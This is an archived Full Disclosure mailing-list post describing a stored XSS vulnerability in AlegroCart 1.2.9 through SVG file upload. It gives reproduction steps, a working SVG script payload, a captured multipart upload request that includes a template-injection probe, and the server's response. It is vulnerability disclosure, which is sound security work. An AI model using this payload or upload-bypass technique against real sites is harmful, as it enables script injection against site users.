---
title: XSS via SVG Image Upload - AlegroCartv1.2.9
url: https://seclists.org/fulldisclosure/2025/Apr/20
source: Full Disclosure
date: 2025-04-25
fetch_date: 2025-10-06T22:08:13.057659
---

# XSS via SVG Image Upload - AlegroCartv1.2.9

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](19)
[By Date](date.html#20)
[![Next](/images/right-icon-16x16.png)](21)

[![Previous](/images/left-icon-16x16.png)](19)
[By Thread](index.html#20)
[![Next](/images/right-icon-16x16.png)](21)

![](/shared/images/nst-icons.svg#search)

# XSS via SVG Image Upload - AlegroCartv1.2.9

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Wed, 23 Apr 2025 22:06:57 +0100

---

```
# Exploit Title: XSS via SVG Image Upload - alegrocartv1.2.9
# Date: 04/2025
# Exploit Author: Andrey Stoykov
# Version: 1.2.9
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

XSS via SVG Image Upload:

Steps to Reproduce:

1. Visit http://192.168.58.129/alegrocart/administrator/?controller=download
2. Upload SVG image file with the contents below
3. Intercept the POST request and change the Content-Type to "Content-Type:
image/jpg"
4. Then visit "http://192.168.58.129/alegrocart/download/xss.svg"; to
trigger the XSS

<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg";>
    <foreignObject width="100%" height="100%">
        <body xmlns="http://www.w3.org/1999/xhtml";>
            <input type="text" onkeyup="prompt('XSS Triggered!')"
placeholder="Type here..."/>
        </body>
    </foreignObject>
</svg>

// HTTP POST request

POST /alegrocart/administrator/?controller=download&action=insert HTTP/1.1
Host: 192.168.58.129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0)
Gecko/20100101 Firefox/138.0
[...]

------geckoformboundary15d78a6e0de83d7fc006c8ad803bfefc
Content-Disposition: form-data; name="language[1][name]"

{{7*7}}
------geckoformboundary15d78a6e0de83d7fc006c8ad803bfefc
Content-Disposition: form-data; name="fileName"

xss.svg
------geckoformboundary15d78a6e0de83d7fc006c8ad803bfefc
Content-Disposition: form-data; name="download"; filename="xss.svg"
Content-Type: image/jpg

<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg";>
    <foreignObject width="100%" height="100%">
        <body xmlns="http://www.w3.org/1999/xhtml";>
            <input type="text" onkeyup="prompt('XSS Triggered!')"
placeholder="Type here..."/>
        </body>
    </foreignObject>
</svg>
------geckoformboundary15d78a6e0de83d7fc006c8ad803bfefc
Content-Disposition: form-data; name="mask"

6760664742675684.svg
------geckoformboundary15d78a6e0de83d7fc006c8ad803bfefc
Content-Disposition: form-data; name="remaining"

1
------geckoformboundary15d78a6e0de83d7fc006c8ad803bfefc
Content-Disposition: form-data; name="79d45153379f999ff64e1198b05faae6"

586fdeeeaf42c0c557291be4d32afe11
------geckoformboundary15d78a6e0de83d7fc006c8ad803bfefc--

// HTTP Response

HTTP/1.1 302 Found
Date: Thu, 03 Apr 2025 20:42:59 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Location:
http://192.168.58.129/alegrocart/administrator/?controller=download
Cache-Control: max-age=0, private, no-store, no-cache, must-revalidate
Expires: Thu, 03 Apr 2025 20:42:59 GMT
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](19)
[By Date](date.html#20)
[![Next](/images/right-icon-16x16.png)](21)

[![Previous](/images/left-icon-16x16.png)](19)
[By Thread](index.html#20)
[![Next](/images/right-icon-16x16.png)](21)

### Current thread:

* **XSS via SVG Image Upload - AlegroCartv1.2.9** *Andrey Stoykov (Apr 23)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")